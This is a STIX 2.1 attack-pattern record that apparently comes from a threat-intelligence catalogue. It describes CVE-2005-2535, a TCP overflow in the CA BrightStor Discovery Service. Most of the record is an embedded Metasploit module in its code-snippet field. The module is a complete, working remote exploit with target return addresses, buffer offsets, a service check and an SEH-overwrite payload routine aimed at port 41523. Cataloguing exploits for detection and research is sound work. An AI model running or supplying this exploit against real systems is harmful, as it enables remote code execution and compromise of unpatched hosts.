{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e4e544c6-2f9c-406c-aa94-b65027445d04",
    "created": "2024-08-14T16:48:27.826627Z",
    "modified": "2024-08-14T16:48:27.826631Z",
    "name": "CA BrightStor Discovery Service TCP Overflow",
    "description": " This module exploits a vulnerability in the CA BrightStor Discovery Service. This vulnerability occurs when a specific type of request is sent to the TCP listener on port 41523. This vulnerability was discovered by cybertronic[at]gmx.net and affects all known versions of the BrightStor product. This module is based on the 'cabrightstor_disco' exploit by HD Moore. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/discovery_tcp.rb",
            "external_id": "discovery_tcp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2535"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/bugtraq/2005-02/0123.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'CA BrightStor Discovery Service TCP Overflow',\n      'Description'    => %q{\n          This module exploits a vulnerability in the CA BrightStor\n        Discovery Service. This vulnerability occurs when a specific\n        type of request is sent to the TCP listener on port 41523.\n        This vulnerability was discovered by cybertronic[at]gmx.net\n        and affects all known versions of the BrightStor product.\n        This module is based on the 'cabrightstor_disco' exploit by\n        HD Moore.\n      },\n      'Author'         => [ 'hdm', 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-2535'],\n          [ 'OSVDB', '13814'],\n          [ 'BID', '12536'],\n          [ 'URL', 'http://archives.neohapsis.com/archives/bugtraq/2005-02/0123.html'],\n          [ 'EDB', '1131']\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 2048,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          [\n            'cheyprod.dll 9/14/2000', # Build 1220.0 9/14/2000 7.0.1220.0\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x23803b20, # pop/pop/ret\n              'Offset'   => 1032,\n            },\n          ],\n          [\n            'cheyprod.dll 12/12/2003',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x23805714, # pop/pop/ret\n              'Offset'   => 1024,\n            },\n          ],\n          [\n            'cheyprod.dll 07/21/2004',\n            {\n              'Platform' => 'win',\n              'Ret'      => 0x23805d10, # pop/pop/ret\n              'Offset'   => 1024,\n            },\n          ],\n        ],\n      'DisclosureDate' => '2005-02-14',\n      'DefaultTarget' => 1))\n\n    register_options(\n      [\n        Opt::RPORT(41523)\n      ])\n  end\n\n  def check\n\n    # The first request should have no reply\n    csock = Rex::Socket::Tcp.create(\n      'PeerHost'  => datastore['RHOST'],\n      'PeerPort'  => datastore['RPORT'],\n      'Context'   =>\n        {\n          'Msf'        => framework,\n          'MsfExploit' => self,\n        })\n\n    csock.put('META')\n    x = csock.get_once(-1, 3)\n    csock.close\n\n    # The second request should be replied with the host name\n    csock = Rex::Socket::Tcp.create(\n      'PeerHost'  => datastore['RHOST'],\n      'PeerPort'  => datastore['RPORT'],\n      'Context'   =>\n        {\n          'Msf'        => framework,\n          'MsfExploit' => self,\n        })\n\n    csock.put('hMETA')\n    y = csock.get_once(-1, 3)\n    csock.close\n\n    if (y and not x)\n      return Exploit::CheckCode::Detected\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    print_status(\"Trying target #{target.name}...\")\n\n    buf = rand_text_english(4096)\n\n    # Overwriting the return address works well, but the only register\n    # pointing back to our code is 'esp'. The following stub overwrites\n    # the SEH frame instead, making things a bit easier.\n\n    seh = generate_seh_payload(target.ret)\n    buf[target['Offset'], seh.length] = seh\n\n    # Make sure the return address is invalid to trigger SEH\n    buf[ 900, 100]     = (rand(127)+128).chr * 100\n\n    # SERVICEPC is the client host name actually =P (thanks Juliano!)\n    req = \"\\x9b\" + 'SERVICEPC' + \"\\x18\" + [0x01020304].pack('N') + 'SERVICEPC' + \"\\x01\\x0c\\x6c\\x93\\xce\\x18\\x18\\x41\"\n    req << buf\n\n    sock.put(req)\n    sock.get_once\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-02-14",
    "x_mitre_platforms": [
        "win'"
    ]
}